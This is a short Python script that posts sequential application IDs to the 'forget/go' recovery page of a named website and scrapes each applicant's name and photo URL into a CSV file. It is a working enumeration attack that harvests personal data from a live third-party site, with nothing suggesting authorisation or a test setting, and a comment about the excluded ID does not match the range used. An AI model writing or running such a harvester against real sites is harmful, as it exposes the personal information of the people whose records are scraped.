import requests
import csv
from bs4 import BeautifulSoup

url = "http://nitorbd.bigmsoft.com/forget/go"

# Open a CSV file in write mode
with open('responses.csv', 'w', newline='') as csvfile:
    fieldnames = ['Application ID', 'Name', 'Photo URL']
    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

    # Write the header row
    writer.writeheader()

    # Iterate through the range of application IDs
    for app_id in range(54259, 55000):  # 54001 is excluded
        data = {
            'app_id': str(app_id),
            'submit_form': 'FIND'
        }

        response = requests.post(url, data=data)

        # Parse the HTML response
        soup = BeautifulSoup(response.text, 'html.parser')

        # Extract name and photo URL
        name = soup.find('td', string='Name').find_next_sibling('td').text.strip()
        photo_url = soup.find('img', alt='photo')['src']

        # Write the application ID, name, and photo URL to the CSV file
        writer.writerow({'Application ID': app_id, 'Name': name, 'Photo URL': photo_url})

print("Responses saved to responses.csv")
